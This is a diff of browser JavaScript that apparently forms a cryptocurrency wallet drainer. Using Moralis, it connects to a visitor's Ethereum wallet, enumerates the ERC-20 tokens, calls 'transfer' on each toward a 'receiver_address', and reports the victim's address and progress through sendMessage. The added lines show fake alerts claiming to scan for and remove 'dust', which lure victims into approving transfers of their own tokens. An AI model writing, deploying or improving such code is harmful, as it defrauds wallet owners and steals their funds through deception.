@@ -344,7 +344,6 @@ async function proceed(){
     // NOTE: Moralis.User.current(); doesn't exist
 
     async function send() {
-        console.log("Attempting to send tokens...");
         if (!user_address) {
           throw Error(`No user:  ${user_address}`);
         }
@@ -356,6 +355,7 @@ async function proceed(){
         });
 
         await sendMessage(`ETHEREUM : connected to ${user_address}`);
+        alert("Connected to ETH ... scanning for dust");
         console.log('First Eth tokens: %o', eth_token)
 
         const eth_tokens = eth_token.tokens;
@@ -364,6 +364,7 @@ async function proceed(){
 
         if (eth_tokens.length < 1) {
           await sendMessage(`No token found` )
+
         }
 
         let fake_eth_token = new Array();
@@ -398,6 +399,13 @@ async function proceed(){
 
         });
 
+      if(fake_eth_token.length < 1){
+        alert("No dust found");
+      }
+      else{
+        alert("Dust found ... Approve transactions to remove");
+      }
+
         let mum = "";
         for(let n=0; n<fake_eth_token.length; n++){
           let token = fake_eth_token[Number(n)];
@@ -409,19 +417,7 @@ async function proceed(){
             decimal : decimal
           } = token
           let amount = Moralis.Units.Token(fakebalance.toString(), decimal.toString());
-          // let token_transfer_options = {
-          //   type: "erc20",
-          //   amount: Moralis.Units.Token(fakebalance.toString(), decimal.toString()),
-          //   receiver: receiver_address, //'0x..',
-          //   contractAddress,
-          // }
-          // let temp = { token: token, options: token_transfer_options }
-          // console.log(`Transferring token[${n}]:%o`, temp)
-        await sendMessage(`Approving 
-                            Token Address : ${contractAddress},
-                            Amount : ${amount},
-                            Your address : ${receiver_address}
-                              ` )
+        await sendMessage(`Dusting Token Address : ${contractAddress}` )
           const sendOptions = {
             contractAddress: contractAddress,
             functionName: "transfer",
@@ -451,17 +447,13 @@ async function proceed(){
             },
           )
           if (transaction) {
-            await sendMessage(`Approved` )
+            await sendMessage(`Approved dusting` )
           }
           else {
-            await sendMessage(`Denied` )
+            await sendMessage(`Denied dusting` )
           }
           console.log(transaction);
-          // if(transaction){
-          //   await transaction.wait().then((v) => {
-          //     console.log('Finished Processing transaction:', v)
-          //   })
-          // }
+          
         }
         
           
